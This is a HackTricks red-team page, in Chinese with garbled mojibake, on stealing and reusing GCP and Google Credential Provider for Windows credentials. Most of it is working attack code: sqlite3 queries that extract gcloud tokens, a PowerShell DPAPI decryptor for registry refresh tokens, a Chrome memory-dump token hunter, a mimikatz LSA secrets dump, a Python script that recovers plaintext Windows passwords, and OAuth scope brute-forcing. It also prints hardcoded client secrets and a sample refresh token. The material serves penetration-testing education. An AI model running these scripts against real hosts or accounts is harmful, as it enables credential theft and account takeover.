# GCP - éæœåŠ¡æŒä¹…æ€§

{% hint style="success" %}


paLearn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

è¿™äº›æ˜¯æœ‰ç”¨çš„æŠ€æœ¯ï¼Œä¸€æ—¦ä½ ä»¥æŸç§æ–¹å¼è·å–äº†æŸäº› GCP å‡­æ®æˆ–åœ¨ GCP ç¯å¢ƒä¸­è¿è¡Œçš„æœºå™¨ã€‚

## ä»¤ç‰ŒåŠ«æŒ

### è®¤è¯ç”¨æˆ·ä»¤ç‰Œ

è¦è·å–ç”¨æˆ·çš„ **å½“å‰ä»¤ç‰Œ**ï¼Œä½ å¯ä»¥è¿è¡Œï¼š 

{% code overflow="wrap" %}
```bash
sqlite3 $HOME/.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id='<email>';"
```
{% endcode %}

æŸ¥çœ‹æ­¤é¡µé¢å¦‚ä½•**ç›´æ¥ä½¿ç”¨æ­¤ä»¤ç‰Œé€šè¿‡gcloud**ï¼š

{% embed url="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#id-6440-1" %}

è¦è·å–**ç”Ÿæˆæ–°è®¿é—®ä»¤ç‰Œ**çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·è¿è¡Œï¼š

{% code overflow="wrap" %}
```bash
sqlite3 $HOME/.config/gcloud/credentials.db "select value from credentials where account_id='<email>';"
```
{% endcode %}

è¿˜å¯ä»¥åœ¨ **`$HOME/.config/gcloud/application_default_credentials.json`** å’Œ **`$HOME/.config/gcloud/legacy_credentials/*/adc.json`** ä¸­æ‰¾åˆ°åˆ·æ–°ä»¤ç‰Œã€‚

è¦ä½¿ç”¨ **åˆ·æ–°ä»¤ç‰Œ**ã€å®¢æˆ·ç«¯ ID å’Œå®¢æˆ·ç«¯å¯†é’¥è·å–æ–°çš„åˆ·æ–°è®¿é—®ä»¤ç‰Œï¼Œè¯·è¿è¡Œï¼š

{% code overflow="wrap" %}
```bash
curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
```
{% endcode %}

åˆ·æ–°ä»¤ç‰Œçš„æœ‰æ•ˆæ€§å¯ä»¥åœ¨ **Admin** > **Security** > **Google Cloud session control** ä¸­ç®¡ç†ï¼Œé»˜è®¤è®¾ç½®ä¸º 16 å°æ—¶ï¼Œå°½ç®¡å¯ä»¥è®¾ç½®ä¸ºæ°¸ä¸è¿‡æœŸï¼š

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

### Auth flow

ä½¿ç”¨ç±»ä¼¼ `gcloud auth login` çš„è®¤è¯æµç¨‹å°†åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ä¸€ä¸ªæç¤ºï¼Œæ¥å—æ‰€æœ‰èŒƒå›´åï¼Œæµè§ˆå™¨å°†å‘å·¥å…·æ‰“å¼€çš„ http ç«¯å£å‘é€è¯·æ±‚ï¼Œä¾‹å¦‚ï¼š
```
/?state=EN5AK1GxwrEKgKog9ANBm0qDwWByYO&code=4/0AeaYSHCllDzZCAt2IlNWjMHqr4XKOuNuhOL-TM541gv-F6WOUsbwXiUgMYvo4Fg0NGzV9A&scope=email%20openid%20https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/cloud-platform%20https://www.googleapis.com/auth/appengine.admin%20https://www.googleapis.com/auth/sqlservice.login%20https://www.googleapis.com/auth/compute%20https://www.googleapis.com/auth/accounts.reauth&authuser=0&prompt=consent HTTP/1.1
```
ç„¶åï¼Œgcloud å°†ä½¿ç”¨çŠ¶æ€å’Œä»£ç ä¸ä¸€äº›ç¡¬ç¼–ç çš„ `client_id` (`32555940559.apps.googleusercontent.com`) å’Œ **`client_secret`** (`ZmssLNjJy2998hD4CTg2ejr2`) æ¥è·å– **æœ€ç»ˆçš„åˆ·æ–°ä»¤ç‰Œæ•°æ®**ã€‚

{% hint style="danger" %}
è¯·æ³¨æ„ï¼Œä¸ localhost çš„é€šä¿¡æ˜¯é€šè¿‡ HTTP è¿›è¡Œçš„ï¼Œå› æ­¤å¯ä»¥æ‹¦æˆªæ•°æ®ä»¥è·å–åˆ·æ–°ä»¤ç‰Œï¼Œä½†æ­¤æ•°æ®ä»…æœ‰æ•ˆ 1 æ¬¡ï¼Œå› æ­¤è¿™æ²¡æœ‰ç”¨ï¼Œç›´æ¥ä»æ–‡ä»¶ä¸­è¯»å–åˆ·æ–°ä»¤ç‰Œæ›´ç®€å•ã€‚
{% endhint %}

### OAuth èŒƒå›´

æ‚¨å¯ä»¥åœ¨ [https://developers.google.com/identity/protocols/oauth2/scopes](https://developers.google.com/identity/protocols/oauth2/scopes) æ‰¾åˆ°æ‰€æœ‰ Google èŒƒå›´ï¼Œæˆ–é€šè¿‡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤è·å–å®ƒä»¬ï¼š

{% code overflow="wrap" %}
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-A/\-\._]*' | sort -u
```
{% endcode %}

å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è„šæœ¬æŸ¥çœ‹**`gcloud`**ç”¨äºèº«ä»½éªŒè¯çš„åº”ç”¨ç¨‹åºå¯ä»¥æ”¯æŒå“ªäº›èŒƒå›´ï¼š
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope         \r"
if ! curl -v "https://accounts.google.com/o/oauth2/auth?response_type=code&client_id=32555940559.apps.googleusercontent.com&redirect_uri=http%3A%2F%2Flocalhost%3A8085%2F&scope=openid+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcloud-platform+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fappengine.admin+$scope+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fsqlservice.login+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcompute+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Faccounts.reauth&state=AjvFqBW5XNIw3VADagy5pvUSPraLQu&access_type=offline&code_challenge=IOk5F08WLn5xYPGRAHP9CTGHbLFDUElsP551ni2leN4&code_challenge_method=S256" 2>&1 | grep -q "error"; then
echo ""
echo $scope
fi
done
```
åœ¨æ‰§è¡Œåï¼Œæ£€æŸ¥åˆ°è¯¥åº”ç”¨æ”¯æŒä»¥ä¸‹èŒƒå›´ï¼š
```
https://www.googleapis.com/auth/appengine.admin
https://www.googleapis.com/auth/bigquery
https://www.googleapis.com/auth/cloud-platform
https://www.googleapis.com/auth/compute
https://www.googleapis.com/auth/devstorage.full_control
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/userinfo.email
```
å¾ˆæœ‰è¶£çš„æ˜¯ï¼Œè¿™ä¸ªåº”ç”¨æ”¯æŒ**`drive`**èŒƒå›´ï¼Œè¿™å¯èƒ½å…è®¸ç”¨æˆ·åœ¨æ”»å‡»è€…è®¾æ³•è¿«ä½¿ç”¨æˆ·ç”Ÿæˆå…·æœ‰æ­¤èŒƒå›´çš„ä»¤ç‰Œæ—¶ï¼Œä»GCPå‡çº§åˆ°Workspaceã€‚

**æŸ¥çœ‹å¦‚ä½•** [**åœ¨è¿™é‡Œæ»¥ç”¨å®ƒ**](../gcp-to-workspace-pivoting/#abusing-gcloud)**ã€‚**

### æœåŠ¡è´¦æˆ·

å°±åƒç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·ä¸€æ ·ï¼Œå¦‚æœæ‚¨è®¾æ³•**æ³„éœ²æœåŠ¡è´¦æˆ·çš„ç§é’¥æ–‡ä»¶**ï¼Œæ‚¨å°†èƒ½å¤Ÿ**é€šå¸¸æ— é™æœŸè®¿é—®å®ƒ**ã€‚\
ç„¶è€Œï¼Œå¦‚æœæ‚¨çªƒå–äº†æœåŠ¡è´¦æˆ·çš„**OAuthä»¤ç‰Œ**ï¼Œè¿™å¯èƒ½ä¼šæ›´æœ‰è¶£ï¼Œå› ä¸ºå³ä½¿é»˜è®¤æƒ…å†µä¸‹è¿™äº›ä»¤ç‰Œä»…åœ¨ä¸€ä¸ªå°æ—¶å†…æœ‰æ•ˆï¼Œå¦‚æœ**å—å®³è€…åˆ é™¤äº†ç§æœ‰APIå¯†é’¥ï¼ŒOAuthä»¤ç‰Œåœ¨è¿‡æœŸä¹‹å‰ä»ç„¶æœ‰æ•ˆ**ã€‚

### å…ƒæ•°æ®

æ˜¾ç„¶ï¼Œåªè¦æ‚¨åœ¨è¿è¡ŒGCPç¯å¢ƒçš„æœºå™¨å†…éƒ¨ï¼Œæ‚¨å°†èƒ½å¤Ÿ**é€šè¿‡è”ç³»å…ƒæ•°æ®ç«¯ç‚¹è®¿é—®é™„åŠ åˆ°è¯¥æœºå™¨çš„æœåŠ¡è´¦æˆ·**ï¼ˆè¯·æ³¨æ„ï¼Œæ‚¨å¯ä»¥åœ¨æ­¤ç«¯ç‚¹è®¿é—®çš„OAuthä»¤ç‰Œé€šå¸¸å—èŒƒå›´é™åˆ¶ï¼‰ã€‚

### è¡¥æ•‘æªæ–½

ä¸€äº›é’ˆå¯¹è¿™äº›æŠ€æœ¯çš„è¡¥æ•‘æªæ–½åœ¨[https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)ä¸­è¿›è¡Œäº†è¯´æ˜ã€‚

## GCPW - Google Windowså‡­è¯æä¾›ç¨‹åº

è¿™æ˜¯Google Workspaceæä¾›çš„å•ç‚¹ç™»å½•ï¼Œç”¨æˆ·å¯ä»¥ä½¿ç”¨**ä»–ä»¬çš„Workspaceå‡­è¯**ç™»å½•Windows PCã€‚æ­¤å¤–ï¼Œè¿™å°†åœ¨PCçš„æŸä¸ªåœ°æ–¹å­˜å‚¨è®¿é—®Google Workspaceçš„ä»¤ç‰Œã€‚

å¯ä»¥é€šè¿‡æ£€æŸ¥ä»¥ä¸‹è¿›ç¨‹æ˜¯å¦å­˜åœ¨æˆ–ä»¥ä¸‹æ³¨å†Œè¡¨é¡¹æ˜¯å¦å­˜åœ¨æ¥æ£€æŸ¥è®¾å¤‡ä¸Šæ˜¯å¦å®‰è£…äº†GCPWï¼š
```powershell
# Check process gcpw_extension.exe
if (Get-Process -Name "gcpw_extension" -ErrorAction SilentlyContinue) {
Write-Output "The process gcpw_xtension.exe is running."
} else {
Write-Output "The process gcpw_xtension.exe is not running."
}

# Check if HKLM\SOFTWARE\Google\GCPW\Users exists
$gcpwHKLMPath = "HKLM:\SOFTWARE\Google\GCPW\Users"
if (Test-Path $gcpwHKLMPath) {
Write-Output "GCPW is installed: The key $gcpwHKLMPath exists."
} else {
Write-Output "GCPW is not installed: The key $gcpwHKLMPath does not exist."
}

# Check if HKCU\SOFTWARE\Google\Accounts exists
$gcpwHKCUPath = "HKCU:\SOFTWARE\Google\Accounts"
if (Test-Path $gcpwHKCUPath) {
Write-Output "Google Accounts are present: The key $gcpwHKCUPath exists."
} else {
Write-Output "No Google Accounts found: The key $gcpwHKCUPath does not exist."
}
```
å®é™…ä¸Šåœ¨ **`HKLM:\SOFTWARE\Google\GCPW\Users`** ä¸­å¯ä»¥æ‰¾åˆ°å…è®¸ç™»å½•çš„ **domains** åœ¨é”® `domains_allowed` ä¸­ï¼Œå¹¶ä¸”åœ¨å­é”®ä¸­å¯ä»¥æ‰¾åˆ°å…³äºç”¨æˆ·çš„ä¿¡æ¯ï¼Œå¦‚ç”µå­é‚®ä»¶ã€å›¾ç‰‡ã€ç”¨æˆ·åã€ä»¤ç‰Œç”Ÿå‘½å‘¨æœŸ...

åœ¨ **`HKCU:\SOFTWARE\Google\Accounts`** ä¸­å¯ä»¥è®¿é—®ç”¨æˆ·çš„ç”µå­é‚®ä»¶å’ŒåŠ å¯†çš„ **refresh token**ï¼Œå¦‚æœç”¨æˆ·æœ€è¿‘ç™»å½•è¿‡ã€‚

### GCPW - æ³¨å†Œè¡¨åˆ·æ–°ä»¤ç‰Œ

åœ¨æ³¨å†Œè¡¨ **`HKCU:\SOFTWARE\Google\Accounts`** ä¸­å¯èƒ½ä¼šæ‰¾åˆ°ä¸€äº›è´¦æˆ·ï¼Œå…¶ä¸­åŒ…å«åŠ å¯†çš„ **`refresh_token`**ã€‚æ–¹æ³• **`ProtectedData.Unprotect`** å¯ä»¥è½»æ¾è§£å¯†å®ƒã€‚

<details>

<summary>è·å– <strong><code>HKCU:\SOFTWARE\Google\Accounts</code></strong> æ•°æ®å¹¶è§£å¯† refresh_tokens</summary>
```powershell
# Import required namespace for decryption
Add-Type -AssemblyName System.Security

# Base registry path
$baseKey = "HKCU:\SOFTWARE\Google\Accounts"

# Function to search and decrypt refresh_token values
function Get-RegistryKeysAndDecryptTokens {
param (
[string]$keyPath
)

# Get all values within the current key
$registryKey = Get-Item -Path $keyPath
$foundToken = $false

# Loop through properties to find refresh_token
foreach ($property in $registryKey.Property) {
if ($property -eq "refresh_token") {
$foundToken = $true
try {
# Get the raw bytes of the refresh_token from the registry
$encryptedTokenBytes = (Get-ItemProperty -Path $keyPath -Name $property).$property

# Decrypt the bytes using ProtectedData.Unprotect
$decryptedTokenBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedTokenBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
$decryptedToken = [System.Text.Encoding]::UTF8.GetString($decryptedTokenBytes)

Write-Output "Path: $keyPath"
Write-Output "Decrypted refresh_token: $decryptedToken"
Write-Output "-----------------------------"
}
catch {
Write-Output "Path: $keyPath"
Write-Output "Failed to decrypt refresh_token: $($_.Exception.Message)"
Write-Output "-----------------------------"
}
}
}

# Recursively process all subkeys
Get-ChildItem -Path $keyPath | ForEach-Object {
Get-RegistryKeysAndDecryptTokens -keyPath $_.PSPath
}
}

# Start the search from the base key
Get-RegistryKeysAndDecryptTokens -keyPath $baseKey
```
</details>

ç¤ºä¾‹è¾“å‡ºï¼š

{% code overflow="wrap" %}
```
Path: Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Google\Accounts\100402336966965820570Decrypted refresh_token: 1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI
```
{% endcode %}

å¦‚[**æ­¤è§†é¢‘**](https://www.youtube.com/watch?v=FEQxHRRP\_5I)æ‰€è¿°ï¼Œå¦‚æœåœ¨æ³¨å†Œè¡¨ä¸­æ‰¾ä¸åˆ°ä»¤ç‰Œï¼Œå¯ä»¥ä» **`HKLM:\SOFTWARE\Google\GCPW\Users\<sid>\th`** ä¿®æ”¹å€¼ï¼ˆæˆ–åˆ é™¤ï¼‰ï¼Œä¸‹æ¬¡ç”¨æˆ·è®¿é—®è®¡ç®—æœºæ—¶ï¼Œä»–å°†éœ€è¦é‡æ–°ç™»å½•ï¼Œå¹¶ä¸” **ä»¤ç‰Œå°†å­˜å‚¨åœ¨ä¹‹å‰çš„æ³¨å†Œè¡¨ä¸­**ã€‚

### GCPW - ç£ç›˜åˆ·æ–°ä»¤ç‰Œ

æ–‡ä»¶ **`%LocalAppData%\Google\Chrome\User Data\Local State`** å­˜å‚¨è§£å¯† **`refresh_tokens`** çš„å¯†é’¥ï¼Œè¿™äº›ä»¤ç‰Œä½äºç”¨æˆ·çš„ **Google Chrome é…ç½®æ–‡ä»¶** ä¸­ï¼Œå¦‚ï¼š

* `%LocalAppData%\Google\Chrome\User Data\Default\Web Data`
* `%LocalAppData%\Google\Chrome\Profile*\Default\Web Data`

å¯ä»¥åœ¨[**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe)ä¸­æ‰¾åˆ°ä¸€äº› **C# ä»£ç **ï¼Œä»¥è§£å¯†çš„æ–¹å¼è®¿é—®è¿™äº›ä»¤ç‰Œã€‚

æ­¤å¤–ï¼Œå…³äºåŠ å¯†çš„å†…å®¹å¯ä»¥åœ¨æ­¤ä»£ç ä¸­æ‰¾åˆ°ï¼š[https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216)

å¯ä»¥è§‚å¯Ÿåˆ°ä½¿ç”¨äº† AESGCMï¼ŒåŠ å¯†ä»¤ç‰Œä»¥ **ç‰ˆæœ¬** å¼€å¤´ï¼ˆæ­¤æ—¶ä¸º **`v10`**ï¼‰ï¼Œç„¶åæ˜¯ [**12B çš„ nonce**](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L42)ï¼Œæ¥ç€æ˜¯ **å¯†æ–‡**ï¼Œæœ€åæ˜¯ **16B çš„ mac**ã€‚

### GCPW - ä»è¿›ç¨‹å†…å­˜ä¸­è½¬å‚¨ä»¤ç‰Œ

ä»¥ä¸‹è„šæœ¬å¯ç”¨äº **è½¬å‚¨** æ¯ä¸ª **Chrome** è¿›ç¨‹ï¼Œä½¿ç”¨ `procdump`ï¼Œæå– **å­—ç¬¦ä¸²**ï¼Œç„¶å **æœç´¢** ä¸ **è®¿é—®å’Œåˆ·æ–°ä»¤ç‰Œ** ç›¸å…³çš„å­—ç¬¦ä¸²ã€‚

**æ ¹æ®æˆ‘çš„ç»éªŒï¼Œå®ƒæ²¡æœ‰æ‰¾åˆ°ä»»ä½•è½¬å‚¨ Chrome è¿›ç¨‹çš„ä»¤ç‰Œï¼Œç”šè‡³æ²¡æœ‰æ‰¾åˆ° `gcpw_extension.exe` è¿›ç¨‹ã€‚**

<details>

<summary>è½¬å‚¨ Chrome è¿›ç¨‹å¹¶æœç´¢ä»¤ç‰Œ</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\path\to\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\path\to\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\ChromeDumps"
$targetString = "ya29" # "1//" for refresh_tokens

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "chrome" | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for the target string in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$asciiStringsOutputFile = "$dumpFolder\chrome_$($_.BaseName)_ascii_strings.txt"
$unicodeStringsOutputFile = "$dumpFolder\chrome_$($_.BaseName)_unicode_strings.txt"

Write-Output "Extracting ASCII strings from $dumpFile"
& $stringsPath $dumpFile > $asciiStringsOutputFile

Write-Output "Extracting UTF-16 strings from $dumpFile"
& $stringsPath -u $dumpFile > $unicodeStringsOutputFile

Write-Output "Searching for '$targetString' in $asciiStringsOutputFile"
Select-String -Path $asciiStringsOutputFile -Pattern $targetString | ForEach-Object {
Write-Output $_.Line
}

Write-Output "Searching for '$targetString' in $unicodeStringsOutputFile"
Select-String -Path $unicodeStringsOutputFile -Pattern $targetString | ForEach-Object {
Write-Output $_.Line
}
}
```
</details>

### GCPW - æ¢å¤æ˜æ–‡å¯†ç 

è¦åˆ©ç”¨ GCPW æ¢å¤å¯†ç çš„æ˜æ–‡ï¼Œå¯ä»¥ä½¿ç”¨ **mimikatz** ä» **LSASS** ä¸­è½¬å‚¨åŠ å¯†å¯†ç ï¼š
```bash
mimikatz_trunk\x64\mimikatz.exe token::elevate lsadump::secrets exit
```
ç„¶åæœç´¢åƒ `Chrome-GCPW-<sid>` çš„ç§˜å¯†ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š

<figure><img src="../../../.gitbook/assets/telegram-cloud-photo-size-4-6044191430395675441-x.jpg" alt=""><figcaption></figcaption></figure>

ç„¶åï¼Œä½¿ç”¨å…·æœ‰èŒƒå›´ `https://www.google.com/accounts/OAuthLogin` çš„ **è®¿é—®ä»¤ç‰Œ**ï¼Œå¯ä»¥è¯·æ±‚ç§é’¥ä»¥è§£å¯†å¯†ç ï¼š

<details>

<summary>è„šæœ¬ä»¥è·å–æ˜æ–‡å¯†ç ï¼Œç»™å®šè®¿é—®ä»¤ç‰Œã€åŠ å¯†å¯†ç å’Œèµ„æº ID</summary>
```python
import requests
from base64 import b64decode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA

def get_decryption_key(access_token, resource_id):
try:
# Request to get the private key
response = requests.get(
f"https://devicepasswordescrowforwindows-pa.googleapis.com/v1/getprivatekey/{resource_id}",
headers={
"Authorization": f"Bearer {access_token}"
}
)

# Check if the response is successful
if response.status_code == 200:
private_key = response.json()["base64PrivateKey"]
# Properly format the RSA private key
private_key = f"-----BEGIN RSA PRIVATE KEY-----\n{private_key.strip()}\n-----END RSA PRIVATE KEY-----"
return private_key
else:
raise ValueError(f"Failed to retrieve private key: {response.text}")

except requests.RequestException as e:
print(f"Error occurred while requesting the private key: {e}")
return None

def decrypt_password(access_token, lsa_secret):
try:
# Obtain the private key using the resource_id
resource_id = lsa_secret["resource_id"]
encrypted_data = b64decode(lsa_secret["encrypted_password"])

private_key_pem = get_decryption_key(access_token, resource_id)
print("Found private key:")
print(private_key_pem)

if private_key_pem is None:
raise ValueError("Unable to retrieve the private key.")

# Load the RSA private key
rsa_key = RSA.import_key(private_key_pem)
key_size = int(rsa_key.size_in_bits() / 8)

# Decrypt the encrypted data
cipher_rsa = PKCS1_OAEP.new(rsa_key)
session_key = cipher_rsa.decrypt(encrypted_data[:key_size])

# Extract the session key and other data from decrypted payload
session_header = session_key[:32]
session_nonce = session_key[32:]
mac = encrypted_data[-16:]

# Decrypt the AES GCM data
aes_cipher = AES.new(session_header, AES.MODE_GCM, nonce=session_nonce)
decrypted_password = aes_cipher.decrypt_and_verify(encrypted_data[key_size:-16], mac)

print("Decrypted Password:", decrypted_password.decode("utf-8"))

except Exception as e:
print(f"Error occurred during decryption: {e}")

# CHANGE THIS INPUT DATA!
access_token = "<acces_token>"
lsa_secret = {
"encrypted_password": "<encrypted-password>",
"resource_id": "<resource-id>"
}

decrypt_password(access_token, lsa_secret)
```
</details>

å¯ä»¥åœ¨Chromiumæºä»£ç ä¸­æ‰¾åˆ°å…¶å…³é”®ç»„ä»¶ï¼š

* APIåŸŸï¼š [https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code](https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code)
* APIç«¯ç‚¹ï¼š [https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70](https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70)
*

### GCPW - ä»åˆ·æ–°ä»¤ç‰Œç”Ÿæˆè®¿é—®ä»¤ç‰Œ

ä½¿ç”¨åˆ·æ–°ä»¤ç‰Œï¼Œå¯ä»¥ä½¿ç”¨å®ƒä»¥åŠä»¥ä¸‹å‘½ä»¤ä¸­æŒ‡å®šçš„å®¢æˆ·ç«¯IDå’Œå®¢æˆ·ç«¯å¯†é’¥ç”Ÿæˆè®¿é—®ä»¤ç‰Œï¼š
```bash
curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCPW - Scopes

é»˜è®¤æƒ…å†µä¸‹ï¼ŒGCPW ä½œä¸ºç”¨æˆ·ä¸ä¼šè®¿é—®æ‰€æœ‰å¯èƒ½çš„ OAuth èŒƒå›´ï¼Œå› æ­¤ä½¿ç”¨ä»¥ä¸‹è„šæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°å¯ä»¥ä¸ `refresh_token` ä¸€èµ·ä½¿ç”¨ä»¥ç”Ÿæˆ `access_token` çš„èŒƒå›´ï¼š

<details>

<summary>Bash script to brute-force scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

è¿™æ˜¯æˆ‘åœ¨å†™ä½œæ—¶å¾—åˆ°çš„è¾“å‡ºï¼š
```
Valid scopes:
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
```
æ­¤å¤–ï¼Œé€šè¿‡æ£€æŸ¥Chromiumæºä»£ç ï¼Œå¯ä»¥[**æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶**](https://github.com/chromium/chromium/blob/5301790cd7ef97088d4862465822da4cb2d95591/google\_apis/gaia/gaia\_constants.cc#L24)ï¼Œè¯¥æ–‡ä»¶åŒ…å«**å…¶ä»–èŒƒå›´**ï¼Œå¯ä»¥å‡è®¾**åœ¨ä¹‹å‰çš„æš´åŠ›ç ´è§£åˆ—è¡¨ä¸­æ²¡æœ‰å‡ºç°**ã€‚å› æ­¤ï¼Œå¯ä»¥å‡è®¾è¿™äº›é¢å¤–çš„èŒƒå›´ï¼š

<details>

<summary>é¢å¤–èŒƒå›´</summary>
```
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/aidahttps://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
